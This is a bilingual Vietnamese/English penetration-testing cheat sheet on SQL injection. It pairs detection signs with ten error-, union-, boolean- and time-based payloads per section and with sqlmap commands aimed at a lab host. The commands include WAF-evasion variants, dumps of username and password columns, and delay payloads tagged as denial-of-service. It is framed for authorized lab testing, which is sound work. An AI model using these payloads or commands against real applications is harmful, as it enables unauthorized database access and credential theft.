# 1. SQL Injection (SQLi)

> [!CAUTION]
> Chỉ dùng trong lab local hoặc hệ thống có ủy quyền rõ ràng. Payload có risk `destructive`, `dos` hoặc `oob` phải chạy trong fixture cô lập, có giới hạn tài nguyên và không có outbound network.

> **Phạm vi kiểm chứng:** Nội dung và payload vẫn ở mức technical review. `static-verified` chỉ xác nhận annotation và kiểm tra tĩnh trong đúng context/version đã ghi; không phải lab evidence và không cho phép sử dụng ngoài phạm vi được ủy quyền.

SQL Injection (SQLi) là lỗ hổng xảy ra khi dữ liệu đầu vào của người dùng được nối trực tiếp vào câu lệnh SQL mà không qua xử lý hoặc tham số hóa, cho phép kẻ tấn công can thiệp vào logic truy vấn của Cơ sở dữ liệu (DBMS).

### 1.1. Error-based SQLi (SQL Injection dựa trên lỗi)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện khi ứng dụng hiển thị trực tiếp các thông báo lỗi chi tiết của hệ quản trị cơ sở dữ liệu (DBMS Error Messages) lên giao diện người dùng (User Interface) hoặc trong phản hồi HTTP (HTTP Response). Các thông báo lỗi này thường chứa tên bảng, tên cột hoặc thông tin cú pháp bị lỗi.
    *   *English*: Error-based SQLi is identified when the application displays verbose database engine error messages (DBMS Error Messages) within the user interface or HTTP responses. These errors expose technical details such as table/column names, query structures, or syntax mismatches.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi các ký tự phá vỡ cú pháp như dấu nháy đơn (`'`), dấu nháy kép (`"`), dấu ngoặc đơn (`(`, `)`), gạch chéo ngược (`\`), hoặc các phép toán chia cho 0 (`1/0`) vào các tham số. Nếu phản hồi trả về mã lỗi HTTP `500 Internal Server Error` kèm thông tin lỗi dạng `SQL syntax error`, `Unclosed quotation mark`, hoặc `Conversion failed`, có khả năng cao điểm đầu vào bị lỗi.
    *   *English*: Input syntax-breaking characters such as `'`, `"`, parenthesis, backslashes `\`, or division-by-zero operations into parameters. Analyze the HTTP response for status code `500` or explicit error messages such as `SQL syntax error` or `Conversion failed`.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-01-001 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.1. Error-based SQLi (SQL Injection dựa trên lỗi) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: ASCII SQL fragments inserted once into the stated single-quoted parameter; percent-encoded cases are decoded exactly once and each DBMS line is tested separately -->
<!-- expected-result: only the payload matching the selected DBMS produces the documented synthetic error/version marker; unsupported engine payloads are rejected -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```sql
    -- 1. MySQL Error-based payload abusing `updatexml()` XML parser function.
    ' AND updatexml(1, concat(0x7e, (SELECT @@version), 0x7e), 1)-- -

    -- 2. MySQL Error-based payload using `extractvalue()`.
    ' AND extractvalue(1, concat(0x7e, (SELECT @@version)))-- -

    -- 3. MySQL Error-based payload via `GTID_SUBSET()` function.
    ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -

    -- 4. MSSQL datatype conversion error (converting version string @@version to integer).
    ' AND CAST((SELECT @@version) AS INT)=1-- -

    -- 4b. PostgreSQL datatype conversion error (converting version() string to integer).
    ' AND CAST(version() AS INT)=1-- -

    -- 5. Generic DBMS division-by-zero error payload (⚠️ MySQL Note: MySQL only returns NULL and raises a warning; this triggers database errors on PostgreSQL/MSSQL).
    '; SELECT 1/0-- -

    -- 6. PostgreSQL datatype conversion error to leak table names.
    ' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)-- -

    -- 7. Oracle XMLType parsing error payload to retrieve current user.
    ' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual) IS NOT NULL-- -

    -- 8. Oracle database error using the `ctxsys.drithsx.sn` function.
    ' AND (SELECT ctxsys.drithsx.sn(1, (SELECT user FROM dual)) FROM dual) IS NOT NULL-- -

    -- 9. MySQL JSON function error.
    ' OR JSON_KEYS((SELECT CONCAT(0x7e, version(), 0x7e)))-- -

    -- 10. URL encoded, mixed-case, and `#` comment character replacing `--` to bypass naive pattern-matching WAF rules.
    %27%20aNd%20ExtractValue(1,%20conCat(0x7e,%20(seLeCt%20veRsIoN()),%200x7e))%23
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng sqlmap để quét tự động phát hiện và khai thác lỗ hổng Error-based SQLi bằng cách giới hạn kỹ thuật quét (`--technique=E`).
    *   *English*: Use sqlmap to scan, detect, and exploit Error-based SQLi by specifying the scan technique (`--technique=E`).
<!-- payload-id: CHEAT-01-002 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.1. Error-based SQLi (SQL Injection dựa trên lỗi) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: only the payload matching the selected DBMS produces the documented synthetic error/version marker; unsupported engine payloads are rejected; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Detect error-based SQLi on target parameter 'id'
    sqlmap -u "http://victim.lab.test/product.php?id=1" --technique=E --batch --banner
    # Extract database names using error-based technique
    sqlmap -u "http://victim.lab.test/product.php?id=1" --technique=E --dbs --batch
    ```

---


### 1.2. Union-based SQLi (SQL Injection dựa trên liên kết)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xuất hiện khi dữ liệu trả về từ câu truy vấn SQL gốc được hiển thị trực tiếp trên giao diện. Kẻ tấn công sử dụng toán tử `UNION` để kết hợp kết quả truy vấn gốc với một truy vấn tùy ý khác, từ đó trích xuất thông tin nhạy cảm từ các bảng khác.
    *   *English*: Union-based SQLi occurs when the query results are rendered directly on the web page. Attackers inject the `UNION` operator to combine the original query results with an arbitrary query to retrieve records from other database tables.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*:
        1. Xác định số lượng cột của câu truy vấn gốc bằng mệnh đề `ORDER BY`: Thử tăng dần chỉ số (`ORDER BY 1`, `ORDER BY 2`,...) cho đến khi trang web thay đổi hành vi hoặc báo lỗi.
        2. Xác định kiểu dữ liệu của từng cột bằng cách chèn `NULL` hoặc giá trị cụ thể: `' UNION SELECT NULL, NULL, NULL-- -`.
    *   *English*:
        1. Determine column count using `ORDER BY N` (increment N until the page structure changes or throws an error).
        2. Determine column data types by injecting `NULL` values or string constants: `' UNION SELECT 'a', NULL, 3-- -`.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-01-003 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.2. Union-based SQLi (SQL Injection dựa trên liên kết) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: ASCII SQL fragments inserted once into the stated single-quoted parameter; percent-encoded cases are decoded exactly once and each DBMS line is tested separately -->
<!-- expected-result: the three-column fixture renders only the selected synthetic columns when column count/types match; the parameterized control returns no injected rows -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```sql
    -- 1. Test if the table has at least 1 column.
    ' ORDER BY 1-- -

    -- 2. Test if the table has at least 10 columns.
    ' ORDER BY 10-- -

    -- 3. 3-column NULL injection (generic compatibility test).
    ' UNION SELECT NULL, NULL, NULL-- -

    -- 4. Test if the first column accepts string values.
    ' UNION SELECT 'a', NULL, NULL-- -

    -- 5. Extract MySQL/MSSQL database version (rendered in the 2nd column).
    ' UNION SELECT NULL, @@version, NULL-- -

    -- 6. Extract PostgreSQL database version.
    ' UNION SELECT NULL, version(), NULL-- -

    -- 7. Extract Oracle database banner.
    ' UNION SELECT NULL, banner, NULL FROM v$version WHERE ROWNUM=1-- -

    -- 8. Extract all tables and databases (MySQL/PostgreSQL/MSSQL).
    ' UNION SELECT table_schema, table_name, NULL FROM information_schema.tables-- -

    -- 9. Extract column names and data types of the `users` table.
    ' UNION SELECT column_name, data_type, NULL FROM information_schema.columns WHERE table_name='users'-- -

    -- 10. Uses MySQL-specific comment syntax (`/*!50000... */`) and mixed-case to bypass strict signature-based WAFs.
    /*!50000%55nion*//*!50000%53elect*/+1,username,password+FRoM+users--+-
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng sqlmap với kỹ thuật Union-based (`--technique=U`) để xác định số lượng cột và trích xuất dữ liệu tốc độ cao.
    *   *English*: Use sqlmap with Union-based technique (`--technique=U`) to automatically determine columns and perform high-speed data extraction.
<!-- payload-id: CHEAT-01-004 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.2. Union-based SQLi (SQL Injection dựa trên liên kết) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the three-column fixture renders only the selected synthetic columns when column count/types match; the parameterized control returns no injected rows; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Detect union-based SQLi and verify column count automatically
    sqlmap -u "http://victim.lab.test/product.php?id=1" --technique=U --batch --banner
    # Dump tables from specific database using Union technique
    sqlmap -u "http://victim.lab.test/product.php?id=1" -D app_db --tables --dump --batch
    ```

---

### 1.3. Blind Boolean-based SQLi (SQL Injection mù logic đúng/sai)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi ứng dụng không trả về dữ liệu truy vấn hay thông tin lỗi cụ thể, nhưng cấu trúc phản hồi hoặc nội dung hiển thị của trang web thay đổi (ví dụ: hiển thị "Chào mừng" vs. "Không tìm thấy tài khoản") dựa trên kết quả logic của câu truy vấn đầu vào là Đúng (True) hoặc Sai (False).
    *   *English*: Boolean-based blind SQLi is present when the application does not display query data or errors, but its response changes dynamically (e.g., displaying different text elements or status codes) depending on whether the injected condition evaluates to True or False.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Chèn các biểu thức logic luôn đúng (`AND 1=1`) và luôn sai (`AND 1=2`). So sánh sự khác biệt trong phản hồi (độ dài Response, sự xuất hiện của các từ khóa cụ thể). Nếu kết quả `AND 1=1` giống trang bình thường còn `AND 1=2` làm mất dữ liệu hoặc thay đổi cấu trúc trang, lỗ hổng tồn tại.
    *   *English*: Inject logical conditions that are always true (`AND 1=1`) and always false (`AND 1=2`). Compare response lengths or text changes. If the "true" input mirrors normal behavior while the "false" input alters the page output, it indicates SQLi.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-01-005 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.3. Blind Boolean-based SQLi (SQL Injection mù logic đúng/sai) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: ASCII SQL fragments inserted once into the stated single-quoted parameter; percent-encoded cases are decoded exactly once and each DBMS line is tested separately -->
<!-- expected-result: the true and false predicates produce the two seeded response markers; the parameterized control makes both inputs data rather than SQL -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```sql
    -- 1. True logical assertion (normal response expected).
    ' AND 1=1-- -

    -- 2. False logical assertion (modified response expected).
    ' AND 1=2-- -

    -- 3. Verify that subqueries are functional.
    ' AND (SELECT 1)=1-- -

    -- 4. Brute-force character check for database version (MySQL).
    ' AND SUBSTRING((SELECT @@version),1,1)='5'-- -

    -- 5. Compare the ASCII value of the first character of the username.
    ' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 1),1,1))>97-- -

    -- 6. Boolean evaluation using `IIF` (MSSQL).
    ' AND (SELECT IIF(1=1, 1, 0))=1-- -

    -- 7. DBMS-agnostic conditional logic check.
    ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END)=1-- -

    -- 8. Check if the database name length is greater than 1.
    ' AND LENGTH((SELECT database()))>1-- -

    -- 9. Check if user `admin` exists in the database.
    ' AND (SELECT EXISTS(SELECT * FROM users WHERE username='admin'))-- -

    -- 10. Uses hex representation (`0x61646d696e` for `admin`), `LIKE` operator instead of `=`, and multi-line comments `/**/` to bypass signature filters on spaces and strings.
    'oR(username/**/Like/**/0x61646d696e)-- -
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng sqlmap với kỹ thuật Boolean-blind (`--technique=B`) để khai thác và trích xuất dữ liệu qua các câu hỏi logic Đúng/Sai.
    *   *English*: Use sqlmap with Boolean-blind technique (`--technique=B`) to exploit and extract database records through True/False questions.
<!-- payload-id: CHEAT-01-006 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.3. Blind Boolean-based SQLi (SQL Injection mù logic đúng/sai) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the true and false predicates produce the two seeded response markers; the parameterized control makes both inputs data rather than SQL; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Detect boolean-based blind SQLi using customized threat levels
    sqlmap -u "http://victim.lab.test/product.php?id=1" --technique=B --level=3 --risk=2 --batch
    # Extract users password hash using Boolean-blind queries
    sqlmap -u "http://victim.lab.test/product.php?id=1" -D app_db -T users -C username,password --dump --batch
    ```

---

### 1.4. Blind Time-based SQLi (SQL Injection mù thời gian)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi ứng dụng không thay đổi giao diện hay cấu trúc phản hồi đối với bất kỳ điều kiện Đúng/Sai nào. Dấu hiệu nhận biết duy nhất là thời gian xử lý và trả về phản hồi (Response Latency) của máy chủ tăng lên rõ rệt khi kẻ tấn công đưa vào các lệnh trì hoãn thời gian thực thi (Time Delay functions).
    *   *English*: Time-based blind SQLi is characterized by responses that do not vary in content, but the database execution latency (response delay) increases when delay functions are triggered under specific logical conditions.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Chèn các câu lệnh gây trễ hệ thống (như `SLEEP()`, `pg_sleep()`, hoặc `WAITFOR DELAY`). Đo thời gian máy chủ phản hồi; nếu thời gian phản hồi tăng lên tương đương với số giây được cấu hình trong payload, điểm đầu vào đó có khả năng cao bị ảnh hưởng.
    *   *English*: Inject database delay queries (such as `SLEEP()`, `pg_sleep()`, or `WAITFOR DELAY`) and measure request round-trip time. If the response delay corresponds to the injected parameter, the application is vulnerable.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-01-007 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.4. Blind Time-based SQLi (SQL Injection mù thời gian) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: ASCII SQL fragments inserted once into the stated single-quoted parameter; percent-encoded cases are decoded exactly once and each DBMS line is tested separately -->
<!-- expected-result: a single bounded request adds approximately five seconds only on the named DBMS; the control and fixed query stay within the baseline latency envelope -->
<!-- risk: dos -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```sql
    -- 1. Triggers 5 seconds sleep in MySQL.
    ' AND SLEEP(5)-- -

    -- 2. Triggers 5 seconds sleep in MSSQL.
    '; WAITFOR DELAY '0:0:5'-- -

    -- 3. Triggers 5 seconds sleep in PostgreSQL.
    ' AND pg_sleep(5)-- -

    -- 4. Triggers 5 seconds sleep in Oracle.
    ' AND (SELECT dbms_pipe.receive_message('a',5) FROM dual)-- -

    -- 5. Subquery-based sleep function for MySQL.
    ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))x)-- -

    -- 6. Stacked query PostgreSQL sleep execution.
    '; SELECT pg_sleep(5)-- -

    -- 7. Conditional sleep in MySQL.
    ' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)-- -

    -- 8. Conditional sleep in MSSQL.
    '; IF (1=1) WAITFOR DELAY '0:0:5'-- -

    -- 9. Oracle time delay combined with string concatenation.
    '||(SELECT 'a' FROM dual WHERE 1=1 AND dbms_pipe.receive_message('a',5)=1)||'

    -- 10. Uses bitwise ampersands `%26` and nested subqueries to obscure the `sleep` function from WAF filters.
    %27%26(select*from(select(sleep(5)))a)%26%27
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng sqlmap với kỹ thuật Time-blind (`--technique=T`) để quét các phản hồi trễ của cơ sở dữ liệu.
    *   *English*: Use sqlmap with Time-blind technique (`--technique=T`) to scan and detect database latency delays.
<!-- payload-id: CHEAT-01-008 -->
<!-- context: MySQL 8.0.36, PostgreSQL 16.2, SQL Server 2022 CU12 and Oracle 19c disposable fixtures; single-quoted WHERE parameter in a synthetic product lookup; case: 1.4. Blind Time-based SQLi (SQL Injection mù thời gian) -->
<!-- prerequisites: seed synthetic product/users tables, select one named DBMS, restore the snapshot after each case and never point the commands at a non-lab URL -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: a single bounded request adds approximately five seconds only on the named DBMS; the control and fixed query stay within the baseline latency envelope; tool output is candidate evidence and must be confirmed against the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Detect time-based blind SQLi and optimize delay settings
    sqlmap -u "http://victim.lab.test/product.php?id=1" --technique=T --time-sec=5 --batch
    # Bypass WAF filtering using space2comment and charencode tamper scripts
    sqlmap -u "http://victim.lab.test/product.php?id=1" --technique=T --tamper=space2comment,charencode --random-agent --batch
    ```

---

## Tài liệu tham khảo

- **[S1]** OWASP SQL Injection Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html — bản hiện hành; truy cập: 2026-07-18.
